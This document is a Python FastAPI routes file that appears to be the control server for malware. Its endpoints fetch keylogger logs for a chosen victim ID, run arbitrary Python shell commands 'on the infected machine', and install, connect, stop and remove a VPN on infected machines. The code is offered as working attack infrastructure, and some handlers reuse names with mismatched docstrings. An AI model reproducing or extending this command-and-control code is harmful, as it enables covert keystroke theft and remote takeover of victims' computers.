# api/routes/routes.py
from fastapi import APIRouter, Depends, Request, Query, File, UploadFile
from api.service.userService import UserService
from api.service.vpnService import VpnService
from typing import Optional
router = APIRouter()

def getUserService(request: Request) -> UserService:
    data_manager = request.app.state.app_state.data_manager
    user_service = UserService(data_manager.user_repository, data_manager.lock)     # Create UserService with UserRepository
    return user_service

def getVpnService(request: Request) -> VpnService:
    data_manager = request.app.state.app_state.data_manager
    vpn_service = VpnService(data_manager.vpn_manager)     # Create VpnService with UserRepository
    return vpn_service

@router.get("/api/users")
async def getAllUsers(user_service: UserService = Depends(getUserService)):
    # Use the user_service to get users
    return user_service.getUsers()

@router.get("/api/modules/keylogger/logs")
async def get_keylogger_logs(id: str = Query(None), user_service: UserService = Depends(getUserService)):
    """
    Retrieve keylogger logs for a specific user based on the provided ID.

    Args:
        id (str): The user ID to retrieve keylogger logs for.
        user_service (UserService): The service to handle user operations.

    Returns:
        The keylogger logs for the specified user.
    """
    return user_service.getKeyloggerLogs(id)

@router.get("/api/shell/{id}")
async def execute_python_shell(id: str, command: str, user_service: UserService = Depends(getUserService)):
    """
    Execute a Python shell command on the infected machine.

    Args:
        id (str): The user ID to execute the command on.
        command (str): The command to execute.
        user_service (UserService): The service to handle user operations.

    Returns:
        The result of the executed command.
    """
    return await user_service.executePythonShell(id, command)

@router.get("/api/modules/vpn/install")
async def install_vpn(id: str = Query(None), vpn_service: VpnService = Depends(getVpnService)):
    """
    Install a VPN on the infected machine.

    Args:
        uuid (str): The user ID to install the VPN on.
        user_service (UserService): The service to handle user operations.

    Returns:
        The result of the VPN installation.
    """
    return await vpn_service.install_vpn(id)

@router.get("/api/modules/vpn/uninstall")
async def install_vpn(id: str = Query(None), vpn_service: VpnService = Depends(getVpnService)):
    """
    Install a VPN on the infected machine.

    Args:
        uuid (str): The user ID to uninstall the VPN on.
        user_service (UserService): The service to handle user operations.

    Returns:
        The result of the VPN uninstallation.
    """
    return await vpn_service.uninstall_vpn(id)

@router.post("/api/modules/vpn/connect")
async def connect_to_vpn(
    file: UploadFile = File(...),
    id: Optional[str] = None,
    vpn_service: VpnService = Depends(getVpnService)
):
    """
    Connect to a VPN on the infected machine.

    Args:
        file (UploadFile): The VPN configuration file to be used for connection.
        id (Optional[str]): The user ID to connect to the VPN on.
        vpn_service (VpnService): The service to handle user operations.

    Returns:
        The result of connecting to the VPN.
    """
    # Read the file content
    config_content = await file.read()
    return await vpn_service.connect_to_vpn(id, config_content)

@router.get("/api/modules/vpn/stop")
async def stop_vpn(id: str = Query(None), vpn_service: VpnService = Depends(getVpnService)):
    """
    Stop the VPN on the infected machine.

    Args:
        id (str): The user ID to stop the VPN on.
        user_service (UserService): The service to handle user operations.

    Returns:
        The result of stopping the VPN.
    """
    return await vpn_service.stop_vpn(id)

@router.get("/api/modules/vpn/status")
async def stop_vpn(id: str = Query(None), vpn_service: VpnService = Depends(getVpnService)):
    """
    Stop the VPN on the infected machine.

    Args:
        id (str): The user ID to stop the VPN on.
        user_service (UserService): The service to handle user operations.

    Returns:
        The result of stopping the VPN.
    """
    return await vpn_service.status_vpn(id)
